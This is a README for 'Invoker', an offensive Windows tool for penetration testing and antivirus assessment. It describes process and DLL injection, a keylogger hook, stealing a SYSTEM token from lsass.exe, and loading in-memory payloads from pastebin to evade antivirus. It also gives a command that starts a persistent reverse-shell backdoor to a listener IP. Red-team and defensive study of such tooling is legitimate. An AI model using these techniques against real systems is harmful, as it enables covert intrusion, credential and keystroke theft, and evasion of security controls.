# Invoker

Penetration testing utility and antivirus assessment tool.

Built with Visual Studio Community 2022 v17.5.4 (64-bit) and tested on Windows 10 Enterprise OS (64-bit).

Made for educational purposes. I hope it will help!

**This repository started to have known signatures and I don't have time to upload new executables each time so you should compile this project yourself.**

Useful websites:

* [elastic.co](https://www.elastic.co/blog/ten-process-injection-techniques-technical-survey-common-and-trending-process)
* [learn.microsoft.com](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format)
* [processhacker.sourceforge.io](https://processhacker.sourceforge.io/doc/index.html)
* [undocumented.ntinternals.net](http://undocumented.ntinternals.net/index.html)
* [pinvoke.net](https://www.pinvoke.net)

To do:

* make process ghosting compatible with x86 architecture because `NtCreateProcessEx` doesn't work well with 32-bit processes.

Future plans:

* ~~process hollowing,~~
* process doppelgänging,
* process herpaderping,
* ~~process ghosting,~~
* more DLL proxying invocations,
* COM hijacking,
* Python3 script to statically obfuscate whole source code.

Things I keep in mind while coding:

* simplify everything,
* ~~use dynamic allocations instead of static allocations,~~ (sometimes)
* use minimum required access rights and control flags,
* handle/catch possible errors/exceptions,
* zero-out and free arrays and memory after use,
* properly close open handles/streams after use,
* decrement reference count of libraries, objects, and similar after use,
* ~~call the garbage cleaner before exiting.~~ (not applicable)

All of the above will result in your PE having smaller size and lesser detection rate.

## Table of Contents

* [Invoker Library](#invoker-library)
* [How to Run](#how-to-run)
* [Bytecode Injection](#bytecode-injection)
* [Generate a Reverse Shell Payload](#generate-a-reverse-shell-payload)
* [PowerShell](#powershell)
* [Direct System Calls](#direct-system-calls)
* [Make a DLL With a Hook Procedure](#make-a-dll-with-a-hook-procedure)
* [Get the LocalSystem Account (NT AUTHORITY\SYSTEM)](#get-the-localsystem-account-nt-authoritysystem)
* [Images](#images)

## Invoker Library

Features:

* invoke the system shells,
* ~~make direct system calls,~~
* use Windows Management Instrumentation (WMI),
* connect to a remote host,
* terminate a running process,
* run a new process,
* dump the memory of a process,
* tamper with the executable image of a process,
* inject bytecode into a process,
* inject DLL into a process,
* list loaded DLLs of a process,
* invoke DLL hijacking,
* install a hook procedure,
* enable access token privileges,
* duplicate the access token of a process and run a new process,
* download a file,
* add/edit a registry key,
* schedule a task,
* list unquoted service paths and start, stop, or restart a service,
* replace multiple System32 files.

Check the Invoker library [here](https://github.com/ivan-sincek/invoker/blob/master/src/Invoker/Invoker/lib/invoker/invoker.cpp). Feel free to use it!

---

Some features may require administrative privilege.

Some features may not work on Windows XP and earlier because of some specific access rights and control flags used.

## How to Run

Run Invoker_x86.exe (32-bit) or Invoker_x64.exe (64-bit).

To automate the reverse shell backdoor while adding persistence, run the following command:

```fundamental
Invoker_x64.exe 192.168.8.5:9000
```

32-bit Invoker can:

* make direct system calls,
* dump the memory of a 32-bit process,
* tamper with and inject the executable image of a 32-bit process into 32-bit process,
* tamper with and inject the executable image of a 64-bit process into 64-bit process,
* inject 32-bit bytecode into a 32-bit process,
* inject 32-bit DLL into a 32-bit process,
* list loaded DLLs of a 32-bit process,
* install a hook procedure from a 32-bit DLL.

64-bit Invoker can:

* make direct system calls,
* dump the memory of a 32-bit process,
* dump the memory of a 64-bit process,
* ~~tamper with and inject the executable image of a 32-bit process into 32-bit process,~~
* tamper with and inject the executable image of a 64-bit process into 64-bit process,
* inject 32-bit bytecode into a 32-bit process,
* inject 64-bit bytecode into a 64-bit process,
* ~~inject 32-bit DLL into a 32-bit process,~~
* inject 64-bit DLL into a 64-bit process,
* ~~list loaded DLLs of a 32-bit process,~~
* list loaded DLLs of a 64-bit process.
* ~~install a hook procedure from a 32-bit DLL,~~
* install a hook procedure from a 64-bit DLL.

Note that each injection technique has both, pros and cons; e.g. some technique requires less access rights, uses less suspicious methods, etc., but might e.g. crash the process, need some time and other special conditions to execute the payload, etc.

Note that some C2C implants might not work after releasing the memory. In that case, comment out methods like `VirtualFreeEx`, `NtFreeVirtualMemory`, etc.

## Bytecode Injection

Elevate privileges by injecting bytecode into a higher-privileged process.

This tool can download the content of a binary file in the memory and inject it into a running process. It can also parse an HTTP response and extract the payload from a custom element, e.g. from `<invoker>payload</invoker>` where `payload` is a binary code encoded in Base64.

Check the example at [pastebin.com/raw/xf9Trt0d](https://pastebin.com/raw/xf9Trt0d).

This is useful if antivirus is constantly deleting your local payloads.

Check an additional example at [pastebin.com/raw/iW17rCxH](https://pastebin.com/raw/iW17rCxH) - payload hidden in the image element.

P.S. Bytecodes provided will most certainly not work for you.

Use [ngrok](https://ngrok.com) to give your local web server a public address.

---

To see if a process is 32-bit or 64-bit, open Task Manager -> click on `More details` -> go to `Details` tab -> right click on any of the columns -> click on `Select columns` -> check the `Platform` checkbox.

To see if a process is running with administrative privilege, check the `Elevated` checkbox.

## Generate a Reverse Shell Payload

Find out how to generate a reverse shell payload from my other [project](https://github.com/ivan-sincek/penetration-testing-cheat-sheet#generate-a-reverse-shell-payload-for-windows-os), as well as, how to set up [Ncat](https://github.com/ivan-sincek/penetration-testing-cheat-sheet#ncat) and [multi/handler](https://github.com/ivan-sincek/penetration-testing-cheat-sheet#multihandler) listeners.

Bytecode injection may fail because bytecode may have bad characters, wrong exit function, or encoding; DLL injection is more reliable.

## PowerShell

If you wish to run a PowerShell reverse or bind shell from the Invoker, open the Invoker and start a PowerShell session, then, run any of the [one-liners](https://github.com/ivan-sincek/powershell-reverse-tcp#powershell-encoded-command) (from my other project).

## Direct System Calls

Direct system calls library and assembly were generated with [SysWhispers2](https://github.com/jthuraisamy/SysWhispers2). Credits to the author!

To generate the same library and assembly, run the following command from your preferred console:

```fundamental
python3 syswhispers.py -f NtOpenProcess,NtClose,NtAllocateVirtualMemory,NtProtectVirtualMemory,NtWriteVirtualMemory,NtFreeVirtualMemory,NtCreateThreadEx,NtTerminateProcess -a all -o syscalls
```

Check my wrapper around the library and assembly [here](https://github.com/ivan-sincek/invoker/blob/master/src/Invoker/Invoker/lib/invoker_syscalls/invoker_syscalls.cpp). Feel free to use it!

## Make a DLL With a Hook Procedure

Check the simple DLL with a hook procedure [here](https://github.com/ivan-sincek/invoker/blob/master/src/InvokerHook/InvokerHook/dllmain.cpp). The hook procedure will invoke a message box on each window close.

Check the keyboard hook procedure (i.e. keylogger) [here](https://github.com/ivan-sincek/invoker/blob/master/src/KeyboardHook/KeyboardHook/dllmain.cpp).

Check the mouse hook procedure that will run a new process on the first mouse click [here](https://github.com/ivan-sincek/invoker/blob/master/src/RunProcessHook/RunProcessHook/dllmain.cpp).

Don't forget to remove all the created artifacts after you are done testing, e.g. remove `keylogger.log`, etc.

## Get the LocalSystem Account (NT AUTHORITY\SYSTEM)

Follow these simple steps:

1. Run the Invoker as administrator.

2. Enable all access token privileges.

3. Duplicate the access token from e.g. Local Security Authority Subsystem Service (lsass.exe) and run a new instance of the Invoker.

4. Within the new Invoker instance, open the Command Prompt and run `whoami`, you should now see `nt authority\system`.

5. Enable all access token privileges once again.

6. Close the old Invoker instance.

## Images

<p align="center"><img src="https://github.com/ivan-sincek/invoker/blob/master/img/invoker.jpg" alt="Invoker"></p>

<p align="center">Figure 1 - Invoker</p>

<p align="center"><img src="https://github.com/ivan-sincek/invoker/blob/master/img/bytecode_injection.jpg" alt="Bytecode Injection"></p>

<p align="center">Figure 2 - Bytecode Injection</p>

<p align="center"><img src="https://github.com/ivan-sincek/invoker/blob/master/img/elevated_privileges.jpg" alt="Elevated Privileges"></p>

<p align="center">Figure 3 - Elevated Privileges</p>
